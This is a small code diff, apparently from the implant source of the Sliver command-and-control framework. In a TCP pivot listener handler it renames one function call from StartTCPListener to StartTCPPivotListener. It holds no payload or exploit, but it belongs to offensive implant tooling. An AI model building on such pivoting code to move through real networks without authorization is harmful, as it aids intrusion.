@@ -98,7 +98,7 @@ func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 		}
 		return
 	}
-	err = pivots.StartTCPListener(tcpPivot.Address)
+	err = pivots.StartTCPPivotListener(tcpPivot.Address)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
